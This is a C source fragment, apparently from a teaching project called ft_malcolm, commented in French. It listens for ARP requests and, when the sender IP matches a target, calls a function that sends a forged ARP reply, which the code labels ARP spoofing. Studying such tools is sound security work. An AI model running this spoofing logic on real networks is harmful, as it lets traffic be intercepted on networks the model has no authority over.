#include "../header/ft_malcolm.h"

volatile bool STOP;

// Recupere paquet: verifie si c'est bien une requete ARP
// Compare l'IP de la requete avec notre IPs src d'input
// Si les IPs correspondent: construction et envoie de la res
void process_packet(int fd, unsigned char *buff, const char *ip_source, const char *ip_target, const char *mac_source, const char *mac_target)
{
	//strucure qui va recevoir le header de la requete capturée (buff)
	struct ethhdr	*eth = (struct ethhdr *)buff;

	//verifie que la requete est bien de type ARP
	if (ntohs(eth->h_proto) == ETH_P_ARP)
	{
		printf (BLUE "[ARP REQUEST] " RESET "An ARP request has been cached!\n");
		//creation d'une structure ARP pour recuperer l'IP à l'origine de la requête
		struct ether_arp	*arp_packet = (struct ether_arp *)(buff + sizeof(struct ethhdr));

		//INET_ADDRSTRLEN= taille max d'une IP
		char sender_ip[INET_ADDRSTRLEN];

		//inet_ntop= convertie l'IP binaire de la requête en str
		inet_ntop(AF_INET, arp_packet->arp_spa, sender_ip, INET_ADDRSTRLEN);

		if (ft_strcmp(ip_source, sender_ip))
		{
			printf (MAGENTA "[ARP MATCH] " RESET "IP source match the IP sender request : %s!\n", sender_ip);
			// ARP spoofing method
			send_arp_reply(fd, ip_source, mac_source, ip_target, mac_target);
			STOP = true;
		}
	}
}